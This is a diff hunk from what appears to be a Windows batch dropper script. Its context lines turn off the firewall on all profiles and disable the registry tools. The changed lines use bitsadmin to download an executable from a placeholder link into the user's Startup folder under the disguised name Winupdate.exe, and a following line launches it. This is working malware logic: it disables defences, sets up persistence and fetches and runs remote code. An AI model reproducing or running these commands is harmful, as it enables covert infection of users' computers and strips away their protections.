@@ -113,8 +113,8 @@ powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
 
-cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+bitsadmin /transfer Packages /download /priority foreground https://Link-to-exe-here "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
 
-powershell -command "start-bitstransfer https://Link-to-exe-here .\Winupdate.exe"
+cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 powershell -command "start Winupdate.exe"
